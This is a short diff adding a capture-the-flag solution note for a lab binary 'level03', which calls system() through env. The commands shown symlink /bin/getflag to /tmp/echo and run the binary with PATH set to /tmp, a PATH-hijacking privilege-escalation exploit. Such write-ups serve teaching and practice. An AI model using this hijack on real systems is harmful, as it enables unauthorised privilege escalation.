@@ -1,0 +1,4 @@
+Binary file "level03" run system("/usr/bin/env echo Exploit me")
+
+ln -s /bin/getflag /tmp/echo
+PATH=/tmp ./level03
